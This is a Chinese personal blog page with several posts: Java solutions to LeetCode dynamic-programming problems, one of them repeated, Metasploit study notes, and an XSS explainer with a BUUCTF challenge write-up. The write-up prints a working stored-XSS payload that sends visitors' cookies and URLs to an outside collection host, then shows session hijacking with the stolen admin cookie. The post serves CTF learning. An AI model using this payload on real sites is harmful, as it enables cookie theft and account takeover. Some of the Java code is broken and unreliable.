<p>本题目是让求从左上角到右下角最短路径，且只能向下或向右。那么我们可以缩小范围，假设与起点相邻的下面节点和右面节点是更小范围的矩形的左上角。那么求这个大矩形的状态（最短路径）就是选择向右和向下中路径相对较短的。所以最小状态就是每个节点到右下角节点的最短距离。</p>
<p><strong>2.确定临界状态：</strong></p>
<p>由题意，我们知道在最下面行和最右列的节点只能有一种选择。所以有式子：</p>
<pre><code>dp[dp.size-1][IndexOfCol]+=dp[dp.size-1][IndexOfCol+1],
dp[IndexOfRow][dp[0].size-1]+=dp[IndexOfRow+1][dp[0].size-1] 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p>不过如果路建立数组记录每个状态，空间复杂度就会达到O（n^2)，显然开销是巨大的。我们可以直接在原数组上修改</p>
<pre><code>grid[IndexOfRow][grid[0].length-1]+=grid[IndexOfRow+1][grid[0].length-1];
grid[grid.length-1][IndexOfCol]+=gird[grid.length-1][IndexOfCol+1]; 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p><strong>3.状态转移方程</strong></p>
<pre><code>grid[i][j]=min(grid[i+1][j],grid[i][j+1])(i&lt;=0&lt;grid.length-1,j&lt;=0&lt;grid[0].length-1)</code></pre><p><strong>4.代码实现：</strong></p>
<pre><code>class Solution {
public int minPathSum(int[][] grid) {
for(int i=grid.length-1;i&gt;=0;i--)
{
        for(int j=grid.length-1;j&gt;=0;j--)
     { 
        if(i==grid.length-1&amp;&amp;j!=grid[0].length-1)
        {
                grid[i][j]+=grid[i][j + 1];
        }
        else if(j==grid[0].length-1&amp;&amp;i!=grid.length-1)
        {
            grid[i][j]+=grid[i + 1][j];
           }
           else if(j!=grid[0].length-1&amp;&amp;i!=grid.length-1)
           {
                grid[i][j]+= Math.min(grid[i + 1][j],grid[i][j + 1]);
           }
        }
}
return grid[0][0];
}
}</code></pre><p>时间复杂度:O(mn)</p>
<p>空间复杂度:O(1)</p>
<h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="#70.爬楼梯"></a>#70.爬楼梯</h2><p>经典的动态规划题</p>
<p><strong>1.定义状态</strong></p>
<p>我们可以把问题分解成最小的问题，即计算1-n（n为楼层数）中到每层楼梯的方法有多少种。由于上楼是层层递进的，而由题目可知上楼无非是从该层往下数的第二层爬两个台阶，或者从该层往下数的第一层爬一个台阶（前提是该楼层的层数大于2)。这样通过递推就可以求出从起点到n层爬楼梯的方法数了。</p>
<p><strong>2.临界状态</strong></p>
<p>有两个特例，即第一层是无法用前两层的方法数相加。从起点到第一层只有一种方法。</p>
<p><strong>3.状态转义方程</strong></p>
<pre><code>dp[i]=dp[i-1]+dp[i-2](2&lt;=i&lt;=n)</code></pre><p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
    public int climbStairs(int n) {
    int []dp=new int[n+1];//定义数组记录到每层的方法数dp[n]就是起点到第n层的方法数
    if(n&lt;2)
    {
        return 1;
    }
    dp[1]=1;
       dp[2]=2;
    for(int i=3;i&lt;=n;i++)
    {
       dp[i]=dp[i-1]+dp[i-2]; 
    }
    return dp[n];
    }
}</code></pre><p>这样的空间复杂度未免有点高，可以定义两个变量代替dp[i-1],dp[i-2]</p>
<pre><code>class Solution {
    public int climbStairs(int n) {
     if(n&lt;2)
        {
       return 1;
     }
     int oldpre=1;
     int pre=1;
     int ans=0;
     for(int i=2;i&lt;=n;i++)
     {
         ans=oldpre+pre;
         oldpre=pre; 
         pre=ans;
     }
     return ans;
   }
}</code></pre><p>时间复杂度:O(n)</p>
<p>空间复杂度:O(1)</p>
<p>看状态转移方程其实可以发现这道题就是求斐波那契数列，斐波那契数列的具体定义（体现了动态规划中的递推思想）：</p>
<p>如果设F(n）为该数列的第n项（n∈N*），那么这句话可以写成如下形式：</p>
<p>　　　　F(n)=F(n-1)+F(n-2)</p>
<p>有关斐波那契数列的问题在这里就不做过多的阐述了。</p>
<h1 id="91-解码方法"><a href="#91-解码方法" class="headerlink" title="91.解码方法"></a>91.解码方法</h1><hr>
<p>这道题在leetcode上的通过率只有20%,看来还是有挑战性的。</p>
<p><strong>1.定义状态</strong></p>
<p>老套路，把大问题分解为可解的小问题。题目要求算出解码的方法数，可以递推求每个字符结尾的子字符串的解码方法，就得到了整个字符串的解码方法有多少种。</p>
<p><strong>2.临界状态</strong></p>
<p>这个题比较繁琐的一点要考虑各种状态。由于A-Z编码是对应1-26的，因此还要考虑0的情况。如果是0，还要判断前一位以及这个0的下标，为0就说明没法解码，直接返回0。下标1或者更大的情况还要看前一位的数字。是1或2，如果下标为1且前面的数字是1或2，说明字符串可以编码为J或T。以该数字为结束的子字符串的编码方法就为1,如果下标更大只需在满足前面数字的为1或2时，令记录该处的值改为下标为i-2处的值。其他情况都为直接返回0(字符串无法编码)。</p>
<p>如果不是0的话也有很多种情况。如果假设s[i]为当前下标处的数字，如果s[i]&gt;0且s[i]&lt;7且s[i-1]=1或者s[i-1]=2，说明编码的方式有很多种，dp[i]=dp[i-1]+dp[i-2]。否则dp[i]=dp[i-1]</p>
<p><strong>3.定义状态方程</strong></p>
<p>dp[i]=dp[i-1]+dp[i-2] (s[i]==1||s[i]==2&amp;&amp;s[i]&gt;0&amp;&amp;s[i]&lt;7)</p>
<p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
public int numDecodings(String s) {
    int []dp=new int[n];
       for(int i=0;i&lt;s.length();i++)
    {
        if(s[i]==&apos;0&apos;)
        { 
            if(i==0)
            {
               return 0;
            }
            else if(i==1)
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                     dp[i]=1;
                }
                else
                {
                     return 0;
                }
            }
            else
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                    dp[i]=dp[i-2];
                }
                else
                {
                    return 0;
                }
            }
       }
      else
      {
          if(i==0)
          {
               dp[i]=1;
          }
         else if(i==1)
         {
             if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                dp[i]=2;
             }
            else
            {
               dp[i]=dp[i-1];
            }
         }
        else
        {
            if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                    dp[i]=dp[i-1]+dp[i-2];
             }
             else
             {
                 dp[i]=dp[i-1];
             }
        }
     }
  }
return dp[s.length()-1]；
   }
}</code></pre><p>时间复杂度:O(N)</p>
<p>空间复杂度:O(N)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ckh65nt08000bjsv9uup8bqdg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-leetcode-动态规划-2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/08/leetcode-动态规划-2/" class="article-date">
  <time datetime="2020-03-08T14:26:37.812Z" itemprop="datePublished">2020-03-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="leetcode-动态规划2（java实现）"><a href="#leetcode-动态规划2（java实现）" class="headerlink" title="leetcode 动态规划2（java实现）"></a>leetcode 动态规划2（java实现）</h1><hr>
<p>#64.最小路径和</p>
<p>这是一个经典的动态规划题，类似于走楼梯问题。</p>
<p><strong>1.定义状态：</strong></p>
<p>本题目是让求从左上角到右下角最短路径，且只能向下或向右。那么我们可以缩小范围，假设与起点相邻的下面节点和右面节点是更小范围的矩形的左上角。那么求这个大矩形的状态（最短路径）就是选择向右和向下中路径相对较短的。所以最小状态就是每个节点到右下角节点的最短距离。</p>
<p><strong>2.确定临界状态：</strong></p>
<p>由题意，我们知道在最下面行和最右列的节点只能有一种选择。所以有式子：</p>
<pre><code>dp[dp.size-1][IndexOfCol]+=dp[dp.size-1][IndexOfCol+1],
dp[IndexOfRow][dp[0].size-1]+=dp[IndexOfRow+1][dp[0].size-1] 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p>不过如果路建立数组记录每个状态，空间复杂度就会达到O（n^2)，显然开销是巨大的。我们可以直接在原数组上修改</p>
<pre><code>grid[IndexOfRow][grid[0].length-1]+=grid[IndexOfRow+1][grid[0].length-1];
grid[grid.length-1][IndexOfCol]+=gird[grid.length-1][IndexOfCol+1]; 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p><strong>3.状态转移方程</strong></p>
<pre><code>grid[i][j]=min(grid[i+1][j],grid[i][j+1])(i&lt;=0&lt;grid.length-1,j&lt;=0&lt;grid[0].length-1)</code></pre><p><strong>4.代码实现：</strong></p>
<pre><code>class Solution {
public int minPathSum(int[][] grid) {
for(int i=grid.length-1;i&gt;=0;i--)
{
        for(int j=grid.length-1;j&gt;=0;j--)
     { 
        if(i==grid.length-1&amp;&amp;j!=grid[0].length-1)
        {
                grid[i][j]+=grid[i][j + 1];
        }
        else if(j==grid[0].length-1&amp;&amp;i!=grid.length-1)
        {
            grid[i][j]+=grid[i + 1][j];
           }
           else if(j!=grid[0].length-1&amp;&amp;i!=grid.length-1)
           {
                grid[i][j]+= Math.min(grid[i + 1][j],grid[i][j + 1]);
           }
        }
}
return grid[0][0];
}
}</code></pre><p>时间复杂度:O(mn)</p>
<p>空间复杂度:O(1)</p>
<h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="#70.爬楼梯"></a>#70.爬楼梯</h2><p>经典的动态规划题</p>
<p><strong>1.定义状态</strong></p>
<p>我们可以把问题分解成最小的问题，即计算1-n（n为楼层数）中到每层楼梯的方法有多少种。由于上楼是层层递进的，而由题目可知上楼无非是从该层往下数的第二层爬两个台阶，或者从该层往下数的第一层爬一个台阶（前提是该楼层的层数大于2)。这样通过递推就可以求出从起点到n层爬楼梯的方法数了。</p>
<p><strong>2.临界状态</strong></p>
<p>有两个特例，即第一层是无法用前两层的方法数相加。从起点到第一层只有一种方法。</p>
<p><strong>3.状态转义方程</strong></p>
<pre><code>dp[i]=dp[i-1]+dp[i-2](2&lt;=i&lt;=n)</code></pre><p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
    public int climbStairs(int n) {
    int []dp=new int[n+1];//定义数组记录到每层的方法数dp[n]就是起点到第n层的方法数
    if(n&lt;2)
    {
        return 1;
    }
    dp[1]=1;
       dp[2]=2;
    for(int i=3;i&lt;=n;i++)
    {
       dp[i]=dp[i-1]+dp[i-2]; 
    }
    return dp[n];
    }
}</code></pre><p>这样的空间复杂度未免有点高，可以定义两个变量代替dp[i-1],dp[i-2]</p>
<pre><code>class Solution {
    public int climbStairs(int n) {
     if(n&lt;2)
        {
       return 1;
     }
     int oldpre=1;
     int pre=1;
     int ans=0;
     for(int i=2;i&lt;=n;i++)
     {
         ans=oldpre+pre;
         oldpre=pre; 
         pre=ans;
     }
     return ans;
   }
}</code></pre><p>时间复杂度:O(n)</p>
<p>空间复杂度:O(1)</p>
<p>看状态转移方程其实可以发现这道题就是求斐波那契数列，斐波那契数列的具体定义（体现了动态规划中的递推思想）：</p>
<p>如果设F(n）为该数列的第n项（n∈N*），那么这句话可以写成如下形式：</p>
<p>　　　　F(n)=F(n-1)+F(n-2)</p>
<p>有关斐波那契数列的问题在这里就不做过多的阐述了。</p>
<h1 id="91-解码方法"><a href="#91-解码方法" class="headerlink" title="91.解码方法"></a>91.解码方法</h1><hr>
<p>这道题在leetcode上的通过率只有20%,看来还是有挑战性的。</p>
<p><strong>1.定义状态</strong></p>
<p>老套路，把大问题分解为可解的小问题。题目要求算出解码的方法数，可以递推求每个字符结尾的子字符串的解码方法，就得到了整个字符串的解码方法有多少种。</p>
<p><strong>2.临界状态</strong></p>
<p>这个题比较繁琐的一点要考虑各种状态。由于A-Z编码是对应1-26的，因此还要考虑0的情况。如果是0，还要判断前一位以及这个0的下标，为0就说明没法解码，直接返回0。下标1或者更大的情况还要看前一位的数字。是1或2，如果下标为1且前面的数字是1或2，说明字符串可以编码为J或T。以该数字为结束的子字符串的编码方法就为1,如果下标更大只需在满足前面数字的为1或2时，令记录该处的值改为下标为i-2处的值。其他情况都为直接返回0(字符串无法编码)。</p>
<p>如果不是0的话也有很多种情况。如果假设s[i]为当前下标处的数字，如果s[i]&gt;0且s[i]&lt;7且s[i-1]=1或者s[i-1]=2，说明编码的方式有很多种，dp[i]=dp[i-1]+dp[i-2]。否则dp[i]=dp[i-1]</p>
<p><strong>3.定义状态方程</strong></p>
<p>dp[i]=dp[i-1]+dp[i-2] (s[i]==1||s[i]==2&amp;&amp;s[i]&gt;0&amp;&amp;s[i]&lt;7)</p>
<p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
public int numDecodings(String s) {
    int []dp=new int[n];
       for(int i=0;i&lt;s.length();i++)
    {
        if(s[i]==&apos;0&apos;)
        { 
            if(i==0)
            {
               return 0;
            }
            else if(i==1)
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                     dp[i]=1;
                }
                else
                {
                     return 0;
                }
            }
            else
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                    dp[i]=dp[i-2];
                }
                else
                {
                    return 0;
                }
            }
       }
      else
      {
          if(i==0)
          {
               dp[i]=1;
          }
         else if(i==1)
         {
             if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                dp[i]=2;
             }
            else
            {
               dp[i]=dp[i-1];
            }
         }
        else
        {
            if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                    dp[i]=dp[i-1]+dp[i-2];
             }
             else
             {
                 dp[i]=dp[i-1];
             }
        }
     }
  }
return dp[s.length()-1]；
   }
}</code></pre><p>时间复杂度:O(N)</p>
<p>空间复杂度:O(N)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ckh65nt0f000gjsv9ipomsn5o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Metasploit学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/29/Metasploit学习笔记/" class="article-date">
  <time datetime="2020-02-29T13:18:12.756Z" itemprop="datePublished">2020-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Metasploit学习笔记"><a href="#Metasploit学习笔记" class="headerlink" title="#Metasploit学习笔记"></a>#Metasploit学习笔记</h2><p><strong>1.简介</strong></p>
<p>目前最流行，最强大，最具拓展性的渗透测试平台。</p>
<p>2003年由HD More发布第一版。由Ruby语言编写</p>
<p>开发版本的更新非常活跃</p>
<p><strong>2.Metasploit Framework</strong></p>
<p>Metasploit Framework是由Ruby语言编写，想要了解更深层次的框架需要对Ruby语言有一定的了解。Metasploit所有的任务都是基于模块实现的，有利于拓展和编写代码。</p>
<p>Metasploit Framework的框架组成结构可以分为：库，接口，模块。</p>
<p><strong>3.Metasploit Framework库</strong></p>
<p>库是已经封装好的可用程序。用户可以在完成逻辑的前提下调用库。</p>
<p>库的文件目录：<br>    usr/share/mteasploit-framework/lib<br>其中rex库提供各种利用漏洞的类库，也提供套接字连接，原始函数和各种其他形式的重新格式化。core库给所有新模块提供基本的API。</p>
<p><strong>4.Metasploit Framework接口</strong></p>
<p>Metasploit Framework提供两个接口：控制台和GUI接口。终端输入    <code>msfconsole</code> 启动Metasploit Framework。</p>
<p><strong>5.Metasploit Framework模块</strong></p>
<p>主要技术功能模块有：Payload模块（成功exploit后，真正在系统执行的代码和指令），辅助模块，POST模块，编码器模块，NOP模块，exploit模块（对于每个漏洞的攻击方法），evasion模块，auxiliary(常被用来扫描)等。</p>
<p>框架目录 <code>usr/share/metasploit-framework/modules</code><br>shellcode是获取shell的代码，属于payload。payload包含三种：single（只要通过内存跳转连接到目标就计算机就可以独立执行所有的代码），stager（目标计算机内存有限无法single时，先建立一个网络连接，为在黑客电脑上下载其他payload），stages（利用stager建立连接下载的payload）。</p>
<p>#Metasploit-Framework的控制台命令</p>
<hr>
<p>banner 查看metasploit的基本信息</p>
<p>help 查看命令</p>
<p>connect 连接到目标服务器的指定端口（类似nc）</p>
<p>show 展示模块的信息(非常重要的命令)</p>
<p>search 搜索模块和漏洞的名称，进行模糊匹配</p>
<p>check 检查是否可用</p>
<p>back 退回msf console</p>
<p>下面以ms08_067为例：<code>search msf08_067</code> 找到这个漏洞利用模块，<code>use exploit/windows/smb/msf08_067_netapi</code> 进入这个漏洞利用模块。<code>show options</code> 显示相应的选项信息。</p>
<p>在设置过程中要用到的命令：</p>
<pre><code>set ：设置模块的参数，比如设置rhost(目标主机)
unset：清除设置
setg：全局设置，即只要有那个名称变量，都会被设置成一样的）
unsetg ：清除全局设置
save：保存设置的值，即保存之后退出仍然会存在
Run / exploit ：相同的作用，都用于执行
jobs：进行的工作
load：调用加载其他插件
unload：取消调用加载其他插件
loadpath ：当有个人开发的模块，调用指定目录存放的模块
Session：可以看到回话，即已经建立的连接
– session -l / -i 可以进入响应的shell（Shell 、Meterpreter session、VNC等不同的回话）
route通过指定session添加路由流量，即当开防火墙端口有漏洞，已经控制了，攻击者路由指定session通向建立的连接路由到被攻击者的机器。原理即是：流量转发的过程
irb：内置的编程开发模块
Resource ：前面已经介绍过了，即指定资源文件，存的就是配置信息（将各种命令存入文件当中）</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ckh65nszp0001jsv9h9j2ehf3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-leetcode-动态规划-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/leetcode-动态规划-1/" class="article-date">
  <time datetime="2020-02-25T09:59:29.059Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="leetcode寒假刷题—动态规划（1）（Java实现）"><a href="#leetcode寒假刷题—动态规划（1）（Java实现）" class="headerlink" title="#leetcode寒假刷题—动态规划（1）（Java实现）"></a>#leetcode寒假刷题—动态规划（1）（Java实现）</h2><p>#5.最长回文子串</p>
<p> 动态规划思路：</p>
<p><strong>1.定义状态</strong></p>
<p> 动态规划实际上就是记录每个状态，每个状态受到之前状态影响。所以，需要定义一个数组（记录每个状态）。这里定义二维数组dp，最小状态dp[i][j]就是记录从第i+1到第j+1的子串是否为回文子串。</p>
<p><strong>2.确定临界状态</strong></p>
<p>很容易就能看出每个字符都相当于一个长度为1的回文子串。所以二维数组对角线元素值都为1。</p>
<p><strong>3.确定状态转移方程</strong></p>
<p>dp[j][i]==（s[i]==s[j]）&amp;&amp;dp[j+1][i-1]</p>
<p>代码如下</p>
<pre><code>class Solution {
public String longestPalindrome(String s) {
if(s.length()==0)
{
    return &quot;&quot;;
}
boolean [][]dp=new boolean[s.length()][s.length()];
for(int i=0;i&lt;s.length();i++)
{
    dp[i][i]=true;//把对角线元素都设为true，因为每个字符也可以当成回文子串
}
int maxlen=1;
int b=0;
for(int i=0;i&lt;s.length();i++)
{
    for(int j=0;j&lt;i;j++)
    {
        if(s.charAt(i)==s.charAt(j))
        {
            if(i-j&gt;2)
                {
                    dp[j][i]=dp[j+1][i-1];
             }
            else
            {
                dp[j][i]=true;
            }
        }
        else
        {
            dp[j][i]=false;
        }
        if(dp[j][i])
        {
            if(i-j+1&gt;maxlen)
            {
                b=j;
                maxlen=i-j+1;
            }
        }
    }
}
        return s.substring(b,b+maxlen);//返回最长回文子串
    }
}</code></pre><p>时间复杂度：O(N^2)</p>
<p>空间复杂度：O(N^2)<br> )，二维 dp 问题，一个状态得用二维有序数对表示，因此空间复杂度是 O(N^2)。</p>
<p><strong>4.改进</strong></p>
<p><strong>中心扩散</strong></p>
<p>假设字符串的某个字符是回文子串的中心，尝试从此点开始向两端扩散。如果子串是偶数子串，该中心就是这个回文子串的字符间的空隙。若是奇数子串，就是字符。<br>因此中心扩散法的思路是：遍历每一个索引，以这个索引为中心，利用“回文串”中心对称的特点，往两边扩散，看最多能扩散多远。</p>
<p><strong>代码实现</strong></p>
<pre><code>public class Solution {

public String longestPalindrome(String s) {
    int len = s.length();
    if (len &lt; 2) {
        return s;
    }
    int maxLen = 1;
    String res = s.substring(0, 1);
    // 中心位置枚举到 len - 2 即可,因为中心位置只可能是下标1到len-2。下标0和len-1是无法向两端扩散的
    for (int i = 0; i &lt; len - 1; i++) {
        String os = centerSpread(s, i, i);
        String es = centerSpread(s, i, i + 1);
        String maxLenStr = os.length() &gt; es.length() ? os :es;//找到是奇数子串长度长还是偶数子串长度长
        if (maxLenStr.length() &gt; maxLen) {
            maxLen = maxLenStr.length();
            res = maxLenStr;
        }
    }
    return res;
}

private String centerSpread(String s, int left, int right) {
    // left = right 的时候，此时回文中心是一个字符，回文串的长度是奇数
    // right = left + 1 的时候，此时回文中心是一个空隙，回文串的长度是偶数
    int len = s.length();
    int i = left;
    int j = right;
    while (i &gt;= 0 &amp;&amp; j &lt; len) {
        if (s.charAt(i) == s.charAt(j)) {
            i--;
            j++;
        } else {
            break;
        }
    }
    // 不满足while条件，此时得到的最大满足条件的子串是下标为i+1到j-1的字符组成的，所以，substring方法的两个参数为i+1，j(substring方法不会截取第二个参数所在下标的字符)
    return s.substring(i + 1, j);
}
}</code></pre><p>时间复杂度：O(N^2)，遍历每个可能的中心时间复杂度为O(N)，而在centerSpread中，向两端扩撒的时间复杂度为O(N)。因此总时间复杂度为O(N^2)。</p>
<p>空间复杂度：O(1)，只使用到常数个临时变量，与字符串长度无关。</p>
<hr>
<p>#53.最大子序和</p>
<p><strong>1.定义状态</strong></p>
<p>dp[i]为以下标为i的元素结束的子序中元素相加最大的子序的元素和。</p>
<p><strong>2.确定临界状态</strong></p>
<p>dp[0]=下标为0的元素的值</p>
<p><strong>3.确定状态转移方程</strong></p>
<p>dp[i]=max(dp[i-1]+nums[i],nums[i])//nums[i]为下标为i的元素</p>
<p>代码如下</p>
<pre><code>class Solution {
public int maxSubArray(int[] nums) {
    int []dp=new int[nums.length];//定义dp数组记录状态
    dp[0]=nums[0];
    int max=dp[0];
    for(int i=1;i&lt;nums.length;i++)
    {
        dp[i]=Math.max(dp[i-1]+nums[i],nums[i]);//状态转义方程
        max=Math.max(max,dp[i]);
    }
}
    return max;
}</code></pre><p>时间复杂度：O(N)</p>
<p>空间复杂度：O(N)</p>
<p><strong>4.改进</strong></p>
<p>动态规划实际上就是空间换时间，所以空间复杂度相对较大。但是一些情况下可以改进空间复杂度，如本题而言，由于状态转移方程为max(dp[i-1]+nums[i],nums[i]),每个状态都和前一个状态相关。那么，就可以定义一个变量记录前一状态的值（dp[i-1]）。这样空间复杂度就由O(N)变为了O(1)。</p>
<pre><code>class Solution {
public int maxSubArray(int[] nums) {
    int ans = nums[0];
    int sum = 0;
    for(int num: nums) {
        if(sum &gt; 0) {//即dp[i-1]+nums[i]&gt;nums[i]
            sum += num;
        } else {
            sum = num;
        }
        ans = Math.max(ans, sum);
    }
        return ans;
}
}</code></pre><p>时间复杂度：O(N)</p>
<p>空间复杂度：O(1)</p>
<hr>
<p>#62.不同路径</p>
<p><strong>1.定义状态</strong></p>
<p>dp[i][j]表示从起点到第i+1行j+1列路径数</p>
<p><strong>2.定义临界状态</strong></p>
<p>由题意可知，从某点开始行进只能向下或向右走（只能从一个点的左边或上边来到该点）。而在第一行，只能从其左边的点走至该点。在第一列，只能从该点上面的点来到此点。<br>所以对于第一行元素dp[0][i],都有dp[0][i]=1,对应的，对于第一列元素dp[i][0]，都有dp[i][0]=1。</p>
<p><strong>3.定义状态转换方程</strong></p>
<p>dp[i][j]=dp[i-1][j]+dp[i]<a href="1<=i<n;1<=j<m">j-1</a></p>
<p>代码如下</p>
<pre><code>class Solution {
public int uniquePaths(int m, int n) {//n为行数，m为列数
    int [][]dp=new int[n][m];
    for(int i=0;i&lt;m;i++)
    {
        dp[0][i]=1;
    }
    for(int i=0;i&lt;n;i++)
    {
        dp[i][0]=1;
    }
    for(int i=1;i&lt;n;i++)
    {
        for(int j=1;j&lt;m;j++)
        {
            dp[i][j]=dp[i-1][j]+dp[i][j-1];
        }
    }
    return dp[n-1][m-1];
}
}</code></pre><p>时间复杂度：O(m*n)</p>
<p>空间复杂度：O(m*n)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ckh65nt050009jsv93m17eyae" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/02/xss/" class="article-date">
  <time datetime="2019-12-02T14:16:00.117Z" itemprop="datePublished">2019-12-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><hr>
<p><strong>1.什么是xss</strong></p>
<p>跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &lt;, &gt;, ‘, ” 等，检查一下用户名是否正确修改了。</p>
<p>xss的三种类型<br>反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分 </p>
<p>存储型xss 存储在服务器中加入代码，如果没有过滤或过滤不严，那么这些代码将储存到，<br>服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，是永久型的。判断是否存在存储型xss时，首先要确定输入点和输入点。查看源码，如果输入的内容在HTML标签内，输入的内容无法被当成JavaScript代码运行。因为浏览器解析时，会把数据以文本形式输出在网页中，此时就需要构造语句 <code>/script&gt;alert(1)&lt;/script&gt;</code>来去闭合HTML标签。</p>
<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是<br>一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和<br>样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，<br>如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它<br>不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有<br>经过严格确认，就会产生DOM XSS漏洞。</p>
<hr>
<p><strong>检测xss</strong></p>
<p>检测xss一般有两种方式，一种是手工检测，另一种是软件检测。这里直接介绍手工检测。输入一些敏感字符，例如’&lt;’,’&gt;’,’()’。提交请求后查看HTML源代码，看这些字符是否被转义。如果输出字符，说明程序很有可能做了过滤。这是在知道输出位置的情况下，另一种””/&gt;***”。手工检测目的就是为了看web应用是否有漏洞。最多的是考虑哪里有输入，数据该在什么地方输出。</p>
<hr>
<p><strong>2.BUU XSS COURSE1</strong></p>
<p>题目链接：<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201" target="_blank" rel="noopener">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p>
<p>打开发现让我们输入内容提交，类似于论坛的发表评论。很容易就能想到这是存储型xss,攻击者提交恶意代码到服务器中，当其他用户访问页面时就会触发这些恶意代码。从而造成cookie泄露。</p>
<p><img src="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>先试试直接提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现没法弹窗，说明网站有限制,可能过滤了script那么试试img标签事件报错<code>&lt;img src=&#39;abc&#39; onerror=&#39;alert(1)&#39;/&gt;</code> 可以弹窗，说明这里有xss点。</p>
<p>接着上传js恶意代码。</p>
<pre><code>&lt;img src=&apos;/aaaww&apos; onerror=&quot;(function(){(new
Image()).src=&apos;http://xss.buuoj.cn/index.php?
do=api&amp;id=PkXQxo&amp;location=&apos;+escape((function()
{try{return document.location.href}catch(e){return &apos;&apos;}})())
+&apos;&amp;toplocation=&apos;+escape((function(){try{return
top.location.href}catch(e){return &apos;&apos;}})())
+&apos;&amp;cookie=&apos;+escape((function(){try{return
document.cookie}catch(e){return &apos;&apos;}})())
+&apos;&amp;opener=&apos;+escape((function(){try{return (window.opener
&amp;&amp; window.opener.location.href)?
window.opener.location.href:&apos;&apos;}catch(e){return &apos;&apos;}})());})();&quot;/&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20191202194601319.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>注意这里的id应该是你在xss平台创建的项目代码的id。打开xss平台，收到上传的信息。发现里面有cookie phpSESSIONID这就是网站管理员的cookie。还能看到http referer（信息来源的地址）我们用这个管理员的cookie去访问referer里的网址，利用Firefox的插件editcookie更改网站的cookie就能得到flag。改变flag我们可以用hackbar。</p>
